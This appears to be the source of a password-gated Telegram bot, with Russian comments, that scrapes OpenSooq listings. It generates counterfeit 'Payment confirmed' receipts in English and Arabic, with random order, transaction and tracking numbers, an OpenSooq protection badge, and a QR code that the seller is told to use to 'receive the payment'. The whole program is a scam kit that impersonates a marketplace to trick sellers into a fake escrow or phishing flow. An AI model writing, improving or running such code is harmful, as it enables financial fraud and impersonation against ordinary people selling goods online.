import os
import asyncio
import io
import json
import re
import random
import unicodedata
import threading
from urllib.parse import urlparse

import requests
import qrcode
import arabic_reshaper
from flask import Flask

from bidi.algorithm import get_display
from bs4 import BeautifulSoup
from PIL import Image, ImageDraw, ImageFont, ImageOps

from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes

# --- НАСТРОЙКИ ---
TOKEN = os.environ.get("TOKEN")
SECRET_PASSWORD = "МойСекретныйПароль123"
ADMIN_ID = 1110325917 

GREEN = "#28A96B" 
LIGHT_GREEN = "#F0F8F4" 
NAVY = "#1D3956"
GRAY = "#748397"
BORDER = "#E1E7EE"
BG_COLOR = "#FCFDFD"
QR_EYE_COLOR = "#0DEF05" 
QR_DOT_COLOR = "#64748B" 

WAITING_PRICE, WAITING_NAME = range(2)

REGISTERED_USERS = {}
RECENT_LINKS = {}

TRANSLATIONS = {
    "EN": {
        "payment_confirmed": "Payment confirmed", "payment_secure": "Your payment has been secured.",
        "order": "Order #", "processing": "Processing", "transaction_id": "Transaction ID",
        "tracking_number": "Tracking Number", "delivery_status": "Delivery Status", "in_progress": "In progress",
        "waiting_seller": "Waiting for the seller\nto receive the funds", "seller_confirmed": "Seller confirmed",
        "preparing": "Preparing shipment", "courier": "Courier pickup", "protected": "Protected by OpenSooq",
        "protected_text": "Your payment is secure and protected until you receive your order.",
        "help": "(i) Need help? Visit our Help Center or contact support.",
        "qr_text": "Send this QR code\nto the seller so they can\nreceive the payment.",
        "no_photo": "NO PHOTO", "price_not_avail": "Price not available"
    },
    "AR": {
        "payment_confirmed": "تم الدفع بنجاح", "payment_secure": "مبلغك محفوظ بأمان.", "order": "طلب رقم #",
        "processing": "جاري المعالجة", "transaction_id": "رقم العملية", "tracking_number": "رقم التتبع",
        "delivery_status": "حالة التوصيل", "in_progress": "جاري التنفيذ", "waiting_seller": "بانتظار البائع\nلاستلام المبلغ",
        "seller_confirmed": "تم تأكيد البائع", "preparing": "جاري التجهيز", "courier": "استلام المندوب",
        "protected": "محمي بواسطة OpenSooq", "protected_text": "مبلغك آمن ومحمي لحين استلام طلبك.",
        "help": "(i) تحتاج مساعدة؟ زر مركز المساعدة أو تواصل معنا.",
        "qr_text": "أرسل رمز الـ QR\nللبائع عشان يقدر\nيستلم المبلغ.",
        "no_photo": "لا توجد صورة", "price_not_avail": "السعر غير متوفر"
    }
}

def font(size, bold=False, is_arabic_text=False):
    # Используем только стандартный шрифт, который точно есть на сервере
    path = "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf" if bold else "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"
    try: 
        return ImageFont.truetype(path, size)
    except: 
        return ImageFont.load_default(size=size)

def get_meta(soup, name):
    tag = soup.find("meta", property=name) or soup.find("meta", attrs={"name": name})
    return tag.get("content", "").strip() if tag else ""

def find_product(obj):
    if isinstance(obj, dict):
        kind = obj.get("@type")
        if kind == "Product" or (isinstance(kind, list) and "Product" in kind): return obj
        for value in obj.values():
            res = find_product(value)
            if res: return res
    if isinstance(obj, list):
        for value in obj:
            res = find_product(value)
            if res: return res
    return None

def get_listing(full_text):
    url_match = re.search(r'(https?://\S+)', full_text)
    if not url_match: raise ValueError("Ссылка не найдена")
    link = url_match.group(1)
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"})
    response = session.get(link, timeout=20, allow_redirects=True)
    response.raise_for_status()
    soup = BeautifulSoup(response.text, "html.parser")
    title, price, currency = None, None, None
    site_title = get_meta(soup, "og:title") or get_meta(soup, "twitter:title")
    if site_title and "None" not in site_title and "OpenSooq Support" not in site_title: title = site_title
    for script in soup.find_all("script", type="application/ld+json"):
        try:
            obj = json.loads(script.string or script.get_text())
            product = find_product(obj)
            if not product: continue
            title = product.get("name") or title
            offers = product.get("offers", {})
            if isinstance(offers, list): offers = offers[0] if offers else {}
            if isinstance(offers, dict):
                price = offers.get("price")
                currency = offers.get("priceCurrency")
        except: continue
    if not price:
        match = re.search(r"(\d+[\.,]?\d*)\s*(KWD|BHD|OMR|JOD|EGP|USD|SAR|AED|QR|RUB|EUR)", full_text, re.IGNORECASE)
        if match:
            price = match.group(1)
            currency = match.group(2).upper()
    image_url = get_meta(soup, "og:image") or get_meta(soup, "twitter:image")
    match_id = re.search(r"(\d{8,12})", response.url)
    listing_id = match_id.group(1) if match_id else "—"
    order_id = f"OS-{random.randint(100000, 999999)}"
    trans_id = f"OSQ-{random.randint(10000000, 99999999)}"
    track_id = f"OS-DEL-{random.randint(1000000, 9999999)}"
    product_image = None
    if image_url:
        try:
            img_resp = session.get(image_url, timeout=15)
            if img_resp.status_code == 200 and len(img_resp.content) > 1000:
                product_image = Image.open(io.BytesIO(img_resp.content)).convert("RGB")
        except: pass
    return {"title": title, "price": price, "currency": currency, "listing_id": listing_id, 
            "image": product_image, "url": response.url, "track_id": track_id, "order_id": order_id, "trans_id": trans_id}

def prepare_text(value):
    value = str(value)
    value = "".join(c for c in value if not unicodedata.category(c).startswith('So'))
    # Для арабского текста просто склеиваем буквы, без переворота
    if any("\u0600" <= c <= "\u06FF" for c in value):
        return arabic_reshaper.reshape(value)
    return value.strip()

def fit_text(draw, value, max_width, size=28, is_arabic_text=False):
    value = prepare_text(value)
    f = font(size, True, is_arabic_text)
    while value and draw.textbbox((0, 0), value, font=f)[2] > max_width: value = value[:-2] + "…"
    return value, f

def generate_new_qr(data, size=230):
    qr = qrcode.QRCode(error_correction=qrcode.constants.ERROR_CORRECT_H, box_size=10, border=0)
    qr.add_data(data)
    qr.make(fit=True)
    matrix = qr.get_matrix()
    n = len(matrix)
    box_size = size // n
    actual_size = box_size * n
    img = Image.new("RGBA", (actual_size, actual_size), (255, 255, 255, 0))
    draw = ImageDraw.Draw(img)
    for r in range(n):
        for c in range(n):
            if matrix[r][c]:
                if (r < 7 and c < 7) or (r < 7 and c >= n - 7) or (r >= n - 7 and c < 7): continue
                x0, y0 = c * box_size, r * box_size
                x1, y1 = x0 + box_size, y0 + box_size
                draw.ellipse([x0, y0, x1, y1], fill=QR_DOT_COLOR)
    def draw_eye(x, y):
        eye_size = box_size * 7
        draw.rounded_rectangle([x, y, x + eye_size, y + eye_size], radius=box_size*2, fill=QR_EYE_COLOR)
        draw.rounded_rectangle([x+box_size, y+box_size, x+eye_size-box_size, y+eye_size-box_size], radius=box_size, fill="white")
        draw.rounded_rectangle([x+box_size*2, y+box_size*2, x+eye_size-box_size*2, y+eye_size-box_size*2], radius=box_size//2, fill=QR_EYE_COLOR)
    draw_eye(0, 0); draw_eye(actual_size - box_size * 7, 0); draw_eye(0, actual_size - box_size * 7)
    return img

def make_card(data, lang="EN"):
    t = TRANSLATIONS[lang]
    W, H = 1000, 1450 
    image = Image.new("RGB", (W, H), BG_COLOR)
    draw = ImageDraw.Draw(image)
    def draw_check_icon(x, y, size, color):
        draw.ellipse((x, y, x+size, y+size), fill=color)
        cx, cy = x + size//2, y + size//2
        draw.line((cx-15, cy, cx-5, cy+10), fill="white", width=6)
        draw.line((cx-5, cy+10, cx+15, cy-10), fill="white", width=6)
    
    draw.rounded_rectangle((40, 40, W-40, 160), radius=20, fill=LIGHT_GREEN)
    draw_check_icon(70, 65, 70, GREEN)
    
    draw.text((160, 70), prepare_text(t["payment_confirmed"]), font=font(36, True, True), fill=NAVY)
    draw.text((160, 115), prepare_text(t["payment_secure"]), font=font(24, False, True), fill=GRAY)
    
    draw.text((W-80, 90), ">", font=font(40, True), fill=GRAY)
    draw.rounded_rectangle((40, 190, W-40, 850), radius=20, fill="white", outline=BORDER, width=2)
    draw.text((70, 220), prepare_text(t["order"]), font=font(24, False, True), fill=GRAY)
    draw.text((70, 250), data["order_id"], font=font(55, True), fill=NAVY)
    draw.rounded_rectangle((70, 320, 240, 365), radius=15, fill="#D1F2D8")
    draw.text((95, 328), prepare_text(t["processing"]), font=font(24, True, True), fill="#1E7D32")
    
    if data["image"]:
        img = ImageOps.fit(data["image"], (220, 220), Image.Resampling.LANCZOS)
        mask = Image.new("L", img.size, 0)
        ImageDraw.Draw(mask).rounded_rectangle((0, 0, 220, 220), radius=15, fill=255)
        image.paste(img, (70, 400), mask)
    else:
        draw.rounded_rectangle((70, 400, 290, 620), radius=15, fill="#E9EFF5")
        draw.text((130, 500), t["no_photo"], font=font(20, True), fill=GRAY)
        
    title, t_font = fit_text(draw, data["title"], 310, 26, is_arabic_text=True)
    draw.text((320, 410), title, font=t_font, fill=NAVY)
    
    curr = data['currency'] if data['currency'] else ""
    price_str = f"{data['price']} {curr}" if data["price"] else t["price_not_avail"]
    draw.text((320, 480), price_str, font=font(45, True), fill=NAVY)
    
    draw.rounded_rectangle((630, 210, 930, 640), radius=20, fill="#F8FAFC", outline=BORDER, width=2)
    qr_img = generate_new_qr(data["url"], size=230) 
    image.paste(qr_img, (665, 240), qr_img) 
    
    draw.multiline_text((780, 495), prepare_text(t["qr_text"]), font=font(18, False, True), fill=GRAY, align="center", anchor="ma", spacing=4)
    draw.line((70, 650, W-70, 650), fill=BORDER, width=2)
    
    draw.rounded_rectangle((70, 690, 120, 725), radius=5, outline=GRAY, width=4)
    draw.line((70, 700, 120, 700), fill=GRAY, width=4)
    draw.text((140, 680), prepare_text(t["transaction_id"]), font=font(22, False, True), fill=GRAY)
    draw.text((140, 710), data["trans_id"], font=font(32, True), fill=NAVY)
    
    truck_x, truck_y = 530, 690
    draw.rectangle((truck_x, truck_y + 10, truck_x + 40, truck_y + 40), outline=GRAY, width=4)
    draw.polygon([(truck_x+40, truck_y+15), (truck_x+60, truck_y+25), (truck_x+60, truck_y+40), (truck_x+40, truck_y+40)], outline=GRAY, width=4)
    draw.ellipse((truck_x+5, truck_y+35, truck_x+15, truck_y+45), fill=GRAY)
    draw.ellipse((truck_x+45, truck_y+35, truck_x+55, truck_y+45), fill=GRAY)
    
    draw.text((610, 680), prepare_text(t["tracking_number"]), font=font(22, False, True), fill=GRAY)
    draw.text((610, 710), data["track_id"], font=font(32, True), fill=NAVY)
    
    draw.rounded_rectangle((40, 880, W-40, 1130), radius=20, fill="white", outline=BORDER, width=2)
    truck_x, truck_y = 70, 910
    draw.rectangle((truck_x, truck_y + 10, truck_x + 40, truck_y + 40), outline=NAVY, width=4)
    draw.polygon([(truck_x+40, truck_y+15), (truck_x+60, truck_y+25), (truck_x+60, truck_y+40), (truck_x+40, truck_y+40)], outline=NAVY, width=4)
    draw.ellipse((truck_x+5, truck_y+35, truck_x+15, truck_y+45), fill=NAVY)
    draw.ellipse((truck_x+45, truck_y+35, truck_x+55, truck_y+45), fill=NAVY)
    
    draw.text((150, 910), prepare_text(t["delivery_status"]), font=font(34, True, True), fill=NAVY)
    
    draw.rounded_rectangle((750, 905, 930, 950), radius=15, fill="#D1F2D8")
    draw.text((780, 915), prepare_text(t["in_progress"]), font=font(22, True, True), fill="#1E7D32")
    
    line_y = 1010
    points = [100, 330, 560, 790]
    draw.line((points[0], line_y, points[-1], line_y), fill=BORDER, width=4)
    draw.line((points[0], line_y, points[1], line_y), fill=GREEN, width=4)
    
    labels = [t["waiting_seller"], t["seller_confirmed"], t["preparing"], t["courier"]]
    for i, p in enumerate(points):
        if i == 0:
            draw.ellipse((p-20, line_y-20, p+20, line_y+20), fill=GREEN)
            draw.line((p-8, line_y, p-2, line_y+8), fill="white", width=4)
            draw.line((p-2, line_y+8, p+10, line_y-8), fill="white", width=4)
            draw.text((p-60, line_y+35), prepare_text(labels[i]), font=font(18, False, True), fill=NAVY)
        else:
            draw.ellipse((p-20, line_y-20, p+20, line_y+20), fill="white", outline=BORDER, width=3)
            draw.text((p-80, line_y+35), prepare_text(labels[i]), font=font(18, False, True), fill=GRAY)
            
    draw.rounded_rectangle((40, 1160, W-40, 1280), radius=20, fill="white", outline=BORDER, width=2)
    draw_check_icon(70, 1185, 60, GREEN)
    draw.text((150, 1185), prepare_text(t["protected"]), font=font(30, True, True), fill=NAVY)
    draw.text((150, 1225), prepare_text(t["protected_text"]), font=font(20, False, True), fill=GRAY)
    draw.text((W-80, 1200), ">", font=font(40, True), fill=GRAY)
    
    draw.rounded_rectangle((40, 1310, W-40, 1390), radius=15, fill="#F0F4F8")
    draw.text((70, 1335), prepare_text(t["help"]), font=font(22, False, True), fill=GRAY)
    
    output = io.BytesIO()
    image.save(output, format="PNG")
    output.seek(0)
    output.name = "card.png"
    return output

def get_blocked_list():
    try:
        with open("blocked.txt", "r") as f: return [int(line.strip()) for line in f if line.strip()]
    except FileNotFoundError: return []

def block_user(user_id):
    blocked = get_blocked_list()
    if user_id not in blocked:
        with open("blocked.txt", "a") as f: f.write(f"{user_id}\n")

def unblock_user(user_id):
    blocked = get_blocked_list()
    if user_id in blocked:
        blocked.remove(user_id)
        with open("blocked.txt", "w") as f:
            for uid in blocked: f.write(f"{uid}\n")
        return True
    return False

async def block_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        target_id = int(context.args[0])
        block_user(target_id)
        await update.message.reply_text(f"✅ Пользователь {target_id} заблокирован!")
    except: await update.message.reply_text("⚠️ Используй: `/block 123456789`", parse_mode="Markdown")

async def unblock_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        target_id = int(context.args[0])
        if unblock_user(target_id): await update.message.reply_text(f"✅ Пользователь {target_id} разблокирован!")
        else: await update.message.reply_text(f"ℹ️ Пользователь {target_id} не в черном списке.")
    except: await update.message.reply_text("⚠️ Используй: `/unblock 123456789`", parse_mode="Markdown")

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not REGISTERED_USERS:
        await update.message.reply_text("Пока никто не зарегистрировался.")
        return
    msg = "👥 *Список пользователей:*\n\n"
    for uid, uname in REGISTERED_USERS.items(): msg += f"👤 @{uname} (ID: `{uid}`)\n"
    await update.message.reply_text(msg, parse_mode="Markdown")

async def links_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not RECENT_LINKS:
        await update.message.reply_text("Ссылок пока не было.")
        return
    msg = "🔗 *Последние 10 ссылок:*\n\n"
    for item in list(RECENT_LINKS.values())[-10:]: msg += f"👤 @{item['user']}\n🔗 {item['url']}\n\n"
    await update.message.reply_text(msg, parse_mode="Markdown")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id in get_blocked_list():
        await update.message.reply_text("⛔ Вы заблокированы."); return
    if context.user_data.get("authorized"): await update.message.reply_text("Ты авторизован! Отправляй ссылку.")
    else: await update.message.reply_text("Привет! Введи пароль:")

async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id in get_blocked_list():
        await update.message.reply_text("⛔ Вы заблокированы."); return
    text = update.message.text.strip()
    if not context.user_data.get("authorized"):
        if text == SECRET_PASSWORD:
            context.user_data["authorized"] = True
            user_id = update.effective_user.id
            username = update.effective_user.username or f"ID_{user_id}"
            REGISTERED_USERS[user_id] = username
            with open("users.txt", "a") as f: f.write(f"ID: {user_id}, @{username}\n")
            try: await context.bot.send_message(chat_id=ADMIN_ID, text=f"🚨 *Новый пользователь!*\n\n👤 @{username}\n🆔 `{user_id}`\n\nЗаблокировать: `/block {user_id}`", parse_mode="Markdown")
            except: pass
            await update.message.reply_text("✅ Доступ открыт.")
        else: await update.message.reply_text("❌ Неверный пароль.")
        return ConversationHandler.END
    user_id = update.effective_user.id
    username = REGISTERED_USERS.get(user_id, update.effective_user.username or f"ID_{user_id}")
    link_match = re.search(r'(https?://\S+)', text)
    if link_match: 
        RECENT_LINKS[user_id] = {"user": username, "url": link_match.group(1)}
        
    await update.message.reply_text("Ссылка получена. Ищу данные...")
    try:
        data = await asyncio.to_thread(get_listing, text)
        context.user_data["card_data"] = data
        await update.message.reply_text("Введи цену (например, 55 KWD). Если цена есть на сайте, просто напиши /skip")
        return WAITING_PRICE
    except Exception as e:
        await update.message.reply_text(f"ОШИБКА:\n{e}"); return ConversationHandler.END

async def get_price(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text != "/skip":
        match = re.search(r"(\d+[\.,]?\d*)\s*(KWD|BHD|OMR|JOD|EGP|USD|SAR|AED|QR|RUB|EUR)", text, re.IGNORECASE)
        if match:
            context.user_data["card_data"]["price"] = match.group(1)
            context.user_data["card_data"]["currency"] = match.group(2).upper()
        else:
            context.user_data["card_data"]["price"] = text
            context.user_data["card_data"]["currency"] = ""
    await update.message.reply_text("Теперь введи название товара (или /skip).")
    return WAITING_NAME

async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text != "/skip": context.user_data["card_data"]["title"] = text
    data = context.user_data["card_data"]
    
    context.user_data["last_card_data"] = data
    
    if data["image"]:
        await update.message.reply_text("Собираю карточку (English)...")
        card = await asyncio.to_thread(make_card, data, "EN")
        await update.message.reply_photo(
            photo=card, 
            caption="Готово! Чтобы сделать арабскую версию, напиши `/create arabic`", 
            read_timeout=60, write_timeout=60, connect_timeout=60
        )
        return ConversationHandler.END
    else:
        await update.message.reply_text("⚠️ Фото нет. Отправь картинку.")
        return ConversationHandler.END

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id in get_blocked_list(): return
    if not context.user_data.get("authorized"): return
    data = context.user_data.get("card_data")
    if not data: return
    await update.message.reply_text("Фото получено! Собираю карточку (English)...")
    try:
        photo_file = await update.message.photo[-1].get_file()
        photo_bytes = await photo_file.download_as_bytearray()
        data["image"] = Image.open(io.BytesIO(photo_bytes)).convert("RGB")
        
        context.user_data["last_card_data"] = data
        
        card = await asyncio.to_thread(make_card, data, "EN")
        await update.message.reply_photo(
            photo=card, 
            caption="Готово! Чтобы сделать арабскую версию, напиши `/create arabic`", 
            read_timeout=60, write_timeout=60, connect_timeout=60
        )
        context.user_data["card_data"] = None
    except Exception as e:
        await update.message.reply_text(f"ОШИБКА:\n{e}")

async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id in get_blocked_list(): return
    
    data = context.user_data.get("last_card_data")
    if not data:
        await update.message.reply_text("Нет данных для генерации. Сначала отправь ссылку и пройди все шаги.")
        return
    
    lang = "EN"
    if context.args and context.args[0].lower() in ["arabic", "ar", "kuwait"]:
        lang = "AR"
        await update.message.reply_text("Собираю карточку (Kuwaiti Arabic)...")
    else:
        await update.message.reply_text("Собираю карточку (English)...")
        
    try:
        card = await asyncio.to_thread(make_card, data, lang)
        await update.message.reply_photo(photo=card, caption="Готово!", read_timeout=60, write_timeout=60, connect_timeout=60)
    except Exception as e:
        await update.message.reply_text(f"❌ ОШИБКА ПРИ СОЗДАНИИ КАРТОЧКИ:\n\n{e}")

async def run_bot():
    bot_app = Application.builder().token(TOKEN).build()
    conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link)],
        states={
            WAITING_PRICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_price)],
            WAITING_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_name)]
        },
        fallbacks=[CommandHandler("start", start)]
    )
    bot_app.add_handler(CommandHandler("block", block_command))
    bot_app.add_handler(CommandHandler("unblock", unblock_command))
    bot_app.add_handler(CommandHandler("users", users_command))
    bot_app.add_handler(CommandHandler("links", links_command))
    bot_app.add_handler(CommandHandler("create", create_command))
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(conv_handler)
    bot_app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    
    await bot_app.initialize()
    await bot_app.start()
    await bot_app.updater.start_polling()
    print("✅ БОТ ЗАПУЩЕН (с командой /create)")

if __name__ == "__main__":
    def start_bot_thread():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(run_bot())
        loop.run_forever()
    
    threading.Thread(target=start_bot_thread, daemon=True).start()
    
    from app import app as flask_app
    port = int(os.environ.get("PORT", 10000))
    print(f"Запуск Flask на порту {port}...")
    flask_app.run(host="0.0.0.0", port=port)